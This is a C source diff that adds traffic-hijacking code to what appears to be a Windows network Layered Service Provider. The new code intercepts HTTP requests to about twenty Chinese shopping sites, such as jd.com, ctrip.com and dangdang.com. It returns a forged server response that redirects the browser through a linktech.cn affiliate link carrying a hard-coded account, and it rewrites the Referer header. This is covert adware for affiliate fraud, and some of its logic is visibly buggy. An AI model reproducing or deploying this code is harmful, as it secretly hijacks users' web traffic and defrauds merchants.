@@ -5,8 +5,128 @@
 #include <time.h>
 #include <stdlib.h>
 
+static LPSTR g_DomainCodeMapping[][2] = {
+	{".linktech.cn", NULL},
+	{".vancl.com", "vancl"},
+	{".jumei.com", "jumei"},
+	{".yihaodian.com", "yihaodian"},
+	{".ctrip.com", "ctrip"},
+	{".moonbasa.com", "moonbasa"},
+	{".gome.com.cn", "gome"},
+	{".vipshop.com", "vipshop"},
+	{".lefeng.com", "lafaso",},
+	{".dangdang.com", "dangdang"},
+	{".dianping.com", "tdianping"},
+	{".meituan.com", "meituan"},
+	{".suning.com", "suning"},
+	{".lashou.com", "lashou"},
+	{".x.com.cn", "xcomcn"},
+	{".xiu.com", "zoshow"},
+	{".51buy.com", "icson"},
+	{".yintai.com", "yintai"},
+	{".wbiao.cn", "wbiao"},
+	{".jd.com", "360buy"},
+};
 
-LPSTR g_pRedirectIdentify = "/";
+/*
+static LPSTR g_pLinktectRedirectTemplate = 
+	"<script>window.location=\"http://click.linktech.cn/%s?m=%s&a=%s&l=99999&l_cd1=0&l_cd2=1&tu=http://%s/\"</script>";
+    */
+
+static LPSTR g_pLinktectRedirectTemplate = 
+	"<html>"
+	"<head>"
+	"<meta http-equiv='pragma' content='no-cache'>"
+	"<meta http-equiv='expires' content='-1'>"
+	"<meta http-equiv='cache-control' content='no-store'/>"
+	"</head>"
+	"<body>"
+	"<script type='text/javascript'>"
+	"window.location='http://click.linktech.cn/%s?m=%s&a=%s&l=99999&l_cd1=0&l_cd2=1&tu=http%%3A%%2F%%2F%s'"
+	"</script>"
+	"</body>"
+	"<html>";
+
+static LPSTR g_pRedirectMessageTemplate = 
+	"HTTP/1.1 200 OK\r\n"
+    "Server: Apache/2.2.23 (Unix) mod_ssl/2.2.23 OpenSSL/1.0.1e DAV/2\r\n"
+    "pragma: no-cache"
+	"cache-control: no-cache"
+    "expires: -1"
+	"Content-Length: %d\r\n"
+    "Connection: close\r\n"
+	"Content-Type: text/html\r\n\r\n"
+	"%s";
+
+static LPSTR g_pRedirectIdentifier = "tellmehowhighisthesky";
+
+PREDIRECT_INFO g_pRedirectInfo = NULL;
+
+BOOL LoadRedirectInfo(VOID) 
+{
+	int iErrno, i;
+
+	g_pRedirectInfo = LspAlloc(sizeof(REDIRECT_INFO), &iErrno);
+	if (g_pRedirectInfo == NULL) {
+		dbgprint("Allocate memory for redirect info failed");
+		return FALSE;
+	}
+
+	g_pRedirectInfo->pAccount = "A100136314";
+
+	g_pRedirectInfo->iNumberOfEBusiness = sizeof(g_DomainCodeMapping) / sizeof (g_DomainCodeMapping[0]);
+	g_pRedirectInfo->pEBusiness = LspAlloc(g_pRedirectInfo->iNumberOfEBusiness * sizeof(EBUSINESS), &iErrno);
+	if (!g_pRedirectInfo->pEBusiness) {
+		dbgprint("Allocate memory for EBusiness struct failed");
+		goto failed;
+	}
+	for (i = 0; i < g_pRedirectInfo->iNumberOfEBusiness; i++) {
+		g_pRedirectInfo->pEBusiness[i].pDomain = g_DomainCodeMapping[i][0];
+		g_pRedirectInfo->pEBusiness[i].pCode = g_DomainCodeMapping[i][1];
+        switch (i) {
+		case 0: // linktect
+            g_pRedirectInfo->pEBusiness[i].pRedirectTemplate = NULL;
+            break;
+		default:
+            g_pRedirectInfo->pEBusiness[i].pRedirectTemplate = g_pLinktectRedirectTemplate;
+            break;
+		}
+		g_pRedirectInfo->pEBusiness[i].bIntercepted = FALSE;
+	}
+
+	__try
+	{
+		InitializeCriticalSection(&g_pRedirectInfo->Lock);
+	}
+	__except(EXCEPTION_EXECUTE_HANDLER)
+	{
+		dbgprint("Initialize critical section for redirect info failed");
+		goto failed;
+	}
+
+	return TRUE;
+
+failed:
+	if (g_pRedirectInfo) {
+		if (g_pRedirectInfo->pEBusiness) {
+			LspFree(g_pRedirectInfo->pEBusiness);
+		}
+		LspFree(g_pRedirectInfo);
+		g_pRedirectInfo = NULL;
+	}
+
+	return FALSE;
+}
+
+VOID FreeRedirectInfo(VOID)
+{
+	if (g_pRedirectInfo) {
+		LspFree(g_pRedirectInfo->pEBusiness);
+		DeleteCriticalSection(&g_pRedirectInfo->Lock);
+		LspFree(g_pRedirectInfo);
+		g_pRedirectInfo = NULL;
+	}
+}
 
 static BOOL GetHttpHeaderValue(char **headers, int n, const char *header, char **value)
 {
@@ -26,9 +146,39 @@ static BOOL GetHttpHeaderValue(char **headers, int n, const char *header, char *
 	return FALSE;
 }
 
+static BOOL HostEndsWith(const char *host, const char *domain)
+{
+	char buf[HOST_MAX_LENGTH + 2];
+	int hostLen, domainLen;
+	int i, j;
+
+	if (!host)
+		return FALSE;
+
+	hostLen = strlen(host);
+	if (hostLen == 0 || hostLen > HOST_MAX_LENGTH)
+		return FALSE;
+
+	if (host[0] != '.') {
+		buf[0] = '.';
+		strcpy(&buf[1], host);
+		hostLen += 1;
+	}
+
+	domainLen = strlen(domain);
+	if (hostLen < domainLen)
+		return FALSE;
+
+	for (i = domainLen - 1, j = hostLen - 1; i >= 0; i--, j--) {
+		if (domain[i] != buf[j])
+			break;
+	}
+
+	return i < 0;
+}
+
 static int MatchingEBusiness(const char *host)
 {
-    /*
 	int i;
 
 	for (i = 0; i < g_pRedirectInfo->iNumberOfEBusiness; i++) {
@@ -36,8 +186,8 @@ static int MatchingEBusiness(const char *host)
 			return i;
 		}
 	}
-*/
-	return 0;
+
+	return -1;
 }
 
 static LPSTR getModifiedReferrerHeader(VOID) {
@@ -156,12 +306,12 @@ main_point:
 	if ((ebindex = MatchingEBusiness(host)) < 0)
 		goto release_sendbuffer;
 
-	/* parse  url  */
+	/* parse  url */
 	{
 		char *bp, *ep;
 		int n;
 
-		bp = startLine + 4;   /* skip "GET " */
+		bp = startLine + 4;
 		if (!(ep = strchr(bp, ' ')))
 			goto release_sendbuffer;
 		*ep = 0;
@@ -182,7 +332,7 @@ main_point:
 	}
 
 	if (ebindex == 0) { // linktect
-		if (memcmp(urlpath, g_pRedirectIdentify, strlen(g_pRedirectIdentify)) == 0) {
+		if (memcmp(urlpath + 1, g_pRedirectIdentifier, strlen(g_pRedirectIdentifier)) == 0) {
 			char *p1, *p2;
 			char *referrer_header, *modified_referrer_header;
 			int referrer_header_len;
@@ -204,7 +354,7 @@ main_point:
 				referrer_header_len = strlen(referrer_header) + 2;
 			}
 
-			freesize = referrer_header_len + (strlen(g_pRedirectIdentify) - 1) +
+			freesize = referrer_header_len + strlen(g_pRedirectIdentifier) +
 				(pSendBuffer->dwBufferSize - (pSendBuffer->pDataEnd - pSendBuffer->pDataStart));
 
 			if (freesize < (int)strlen(modified_referrer_header)) {
@@ -222,11 +372,11 @@ main_point:
 			}
 
 			// drop redirect identifier
-			p1 = strstr(pSendBuffer->pDataStart, g_pRedirectIdentify);
-			p2 = p1 + strlen(g_pRedirectIdentify) - 1;
+			p1 = strstr(pSendBuffer->pDataStart, g_pRedirectIdentifier);
+			p2 = p1 + strlen(g_pRedirectIdentifier);
 			memmove(p1, p2, pSendBuffer->pDataEnd - p2) ;
-			pSendBuffer->pDataEnd -= (strlen(g_pRedirectIdentify) - 1);
-			referrer_header -= (strlen(g_pRedirectIdentify) - 1);
+			pSendBuffer->pDataEnd -= (strlen(g_pRedirectIdentifier));
+			referrer_header -= (strlen(g_pRedirectIdentifier));
 
 			// modify referrer
 			if (drop_referrer) {
@@ -245,10 +395,10 @@ main_point:
 			SocketContext->pSendBuffer = pSendBuffer;
 			return;
 		}
-		goto release_sendbuffer;
-	}
 
-    /*
+		goto release_sendbuffer;
+	} 
+
 	EnterCriticalSection(&g_pRedirectInfo->Lock);
 	if (g_pRedirectInfo->pEBusiness[ebindex].bIntercepted)
 		goto release_sendbuffer;
@@ -257,36 +407,38 @@ main_point:
 
 	// build receive buffer
 	{
-		int account_index, n;
+		int iContentLength, n;
 		char redirect_url[URL_MAX_LENGTH];
 		int rcvbuf_len;
 		PGAUSSBUF pReceiveBuffer;
 
-		// build redirect url
-		account_index = GetRandomizedAccountIndex();
-		n = _snprintf(redirect_url, 
+		iContentLength = _snprintf(redirect_url, 
 			sizeof(redirect_url), 
-			g_pRedirectInfo->pRedirectUrlTemplate, 
-			g_pRedirectInfo->pEBusiness[ebindex].pCode, 
-			g_pRedirectInfo->pAccount[account_index].pCode,
-			url);
-		if (n < 0 || n == sizeof(redirect_url))
+			g_pRedirectInfo->pEBusiness[ebindex].pRedirectTemplate,
+            g_pRedirectIdentifier,
+            g_pRedirectInfo->pEBusiness[ebindex].pCode,
+            g_pRedirectInfo->pAccount,
+			host);
+        dbgprint("G: redirect url: %s", redirect_url);
+		if (iContentLength < 0 || iContentLength == sizeof(redirect_url)) {
+            dbgprint("G: buffer is too small, redirect failed");
 			goto release_sendbuffer;
+		}
 
-		rcvbuf_len = strlen(g_pRedirectMessageTemplate) + n;
+		rcvbuf_len = strlen(g_pRedirectMessageTemplate) + iContentLength + 16;
 		if (!(pReceiveBuffer = CreateGaussBuf(rcvbuf_len))) {
 			dbgprint("Gauss - error: allocate memory for recevie buffer failed");
 			goto release_sendbuffer;
 		}
 
-		n = _snprintf(pReceiveBuffer->pBuffer, rcvbuf_len, g_pRedirectMessageTemplate, redirect_url);
+		n = _snprintf(pReceiveBuffer->pDataEnd, rcvbuf_len, g_pRedirectMessageTemplate, 
+			        iContentLength, redirect_url);
 		pReceiveBuffer->pDataEnd += n;
 
 		SocketContext->pReceiveBuffer = pReceiveBuffer;
 
 		goto release_sendbuffer;
 	}
-    */
 
 release_sendbuffer:
 	FreeGaussBuf(&pSendBuffer);
